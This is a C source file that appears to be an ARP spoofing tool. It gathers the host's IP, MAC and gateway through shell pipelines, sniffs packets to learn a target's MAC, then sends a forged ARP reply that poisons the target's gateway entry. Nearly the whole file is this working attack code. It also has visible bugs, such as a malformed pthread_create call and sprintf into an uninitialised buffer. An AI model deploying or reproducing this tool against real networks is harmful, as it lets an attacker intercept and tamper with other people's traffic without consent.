#include <pthread.h>
#include <pcap/pcap.h>
#include <stdlib.h>
#include <stdio.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <string.h>
#include <libnet.h>

struct ip *iph; // IP header structure
char s_iaddr[20];
char s_gaddr[20];
char r_iaddr[20];
u_int32_t s_ip_addr,g_ip_addr,r_ip_addr;
u_int8_t s_haddr[7],r_haddr[7];

void get_info()
{
    int i;
    u_char tmp1[20], tmp3[20];
    char *tmp2;

    FILE *p1 = popen("ip addr | grep \"inet \" | grep brd | awk '{print $2}' | awk -F/ '{print $1}'", "r"); //Get Sender IP Adress
    fgets(s_iaddr,16, p1);
    i=0;
    tmp2 = strtok(s_iaddr,".");
    while(tmp2 != NULL)
    {
        tmp3[i] = strtoul(tmp2,NULL,10);
        tmp2 = strtok(NULL, ".");
        i++;
    }
    s_ip_addr=tmp3[0]+(tmp3[1]<<8)+(tmp3[2]<<16)+(tmp3[3]<<24);


    FILE *p2 = popen("ip addr | grep \"link/ether \" | grep brd | awk '{print $2}'", "r"); //Get Sender MAC Address
    fgets(tmp1,18, p2);
    i=0;
    tmp2 = strtok(tmp1,":");
    while(tmp2 != NULL)
    {
        s_haddr[i] = strtoul(tmp2,NULL,16);
        tmp2 = strtok(NULL, ":");
        i++;
    }

    FILE *p3 = popen("netstat -r | grep default | awk '{print $2}'","r"); //Get Gateway IP Address
    fgets(s_gaddr,16, p3);
    i=0;
    tmp2 = strtok(s_gaddr,".");
    while(tmp2 != NULL)
    {
        tmp3[i] = strtoul(tmp2,NULL,10);
        tmp2 = strtok(NULL, ".");
        i++;
    }
    g_ip_addr=tmp3[0]+(tmp3[1]<<8)+(tmp3[2]<<16)+(tmp3[3]<<24);

}

void send_arp(int spoof) {
    char errbuf[LIBNET_ERRBUF_SIZE], target_ip_addr_str[16];
    libnet_t *l;
    u_int8_t mac_broadcast_addr[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff}, mac_zero_addr[6] = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0};

    l = libnet_init(LIBNET_LINK, NULL, errbuf);
    if (l == NULL) exit(-1);

    if (spoof==1)
    {
        if (libnet_autobuild_arp(ARPOP_REPLY, s_haddr, (u_int8_t*)(&g_ip_addr), r_haddr, (u_int8_t*)(&r_ip_addr), l) == -1){
          libnet_destroy(l);
          exit(-1);
        }
        if(libnet_autobuild_ethernet(r_haddr, ETHERTYPE_ARP, l) == -1){
          libnet_destroy(l);
          exit(-1);
        }
        printf("[+] Done!\n");
    }else{
        if (libnet_autobuild_arp(ARPOP_REQUEST, s_haddr, (u_int8_t*)(&s_iaddr), mac_zero_addr, (u_int8_t*)(&r_iaddr), l) == -1){
          libnet_destroy(l);
          exit(-1);
        }
        if(libnet_autobuild_ethernet(mac_broadcast_addr, ETHERTYPE_ARP, l) == -1){
          libnet_destroy(l);
          exit(-1);
        }
    }

    libnet_write(l);
    libnet_destroy(l);
}

void *scan_arp()
{
    char *device; // network device
    char *net; // IP Address
    bpf_u_int32 netp;
    bpf_u_int32 maskp;
    char errbuf[PCAP_ERRBUF_SIZE]; //buf for error msg
    unsigned short ether_type;    
    const u_char *packet;
    int res, i;
    char tmp1[20];
    char *tmp2;

    struct ether_header *ep;
    struct bpf_program filter;
    struct in_addr net_addr;
    struct pcap_pkthdr *pkthdr;

    pcap_t *pcd; // discriptor

    device = pcap_lookupdev(errbuf);
    if (device == NULL)
    {
        printf("%s\n", errbuf);
        exit(1);
    }
    printf("Device: %s\n", device);

    if (pcap_lookupnet(device, &netp, &maskp, errbuf) == -1)
    {
        printf("%s\n", errbuf);
        exit(1);
    }

    net_addr.s_addr = netp;
    net = inet_ntoa(net_addr);

    printf("[+] Get the Recever's MAC...\n");

    pcd = pcap_open_live(device, BUFSIZ,  1, -1, errbuf);
    if (!pcd) exit(1);

    while((res = pcap_next_ex(pcd, &pkthdr, &packet)) >= 0){
        if (res == 0) continue;
        ep = (struct ether_header *)packet;
        packet += sizeof(struct ether_header);
        ether_type = ntohs(ep->ether_type);
        iph = (struct ip *)(packet);

        if (ether_type == ETHERTYPE_IP)
        {
            r_haddr[0]='\0';

            if(strcmp(inet_ntoa(iph->ip_src), r_iaddr)==0) //Recv and Parse Recever's MAC
            {
                for (i=0; i<ETH_ALEN-1; ++i)
                {
                    sprintf(tmp1,"%s%02x:",tmp1,ep->ether_shost[i]);
                }
                sprintf(tmp1,"%s%02x",tmp1,ep->ether_shost[i]);

                tmp2 = strtok(tmp1,":");
                i=0;
                while(tmp2 != NULL)
                {
                    r_haddr[i] = strtoul(tmp2,NULL,16);
                    tmp2 = strtok(NULL, ":");
                    i++;
                }
                printf("[+] Detected! - %s\n",r_iaddr);
                printf("[+] Start ARP Spoofing...\n");
                //while(1)
                send_arp(1); //Send ARP Spoofing Packet
                exit(0);
            }
        }
    }
}

int main(int argc, char *argv[])
{
    int i;
    u_char tmp1[20], tmp3[20];
    char *tmp2;
    
    strncpy(r_iaddr,argv[1],15);
    strncpy(tmp3,r_iaddr,15);

    i=0;
    tmp2 = strtok(tmp3,".");
    while(tmp2 != NULL)
    {
        tmp3[i] = strtoul(tmp2,NULL,10);
        tmp2 = strtok(NULL, ".");
        i++;
    }
    r_ip_addr=tmp3[0]+(tmp3[1]<<8)+(tmp3[2]<<16)+(tmp3[3]<<24);
   
    pthread_t thread_t;
    get_info();

    send_arp(0); //Send ARP Packet(To get Recever's MAC)

    printf("PThread Start\n");
    if (pthread_create(&thread_t, NULL, scan_arp(r_iaddr), (void *)r_iaddr) < 0)
    {
        perror("thread create error:");
        exit(-1);
    }

    pthread_join(thread_t, (void **)NULL);

    return 0;
}
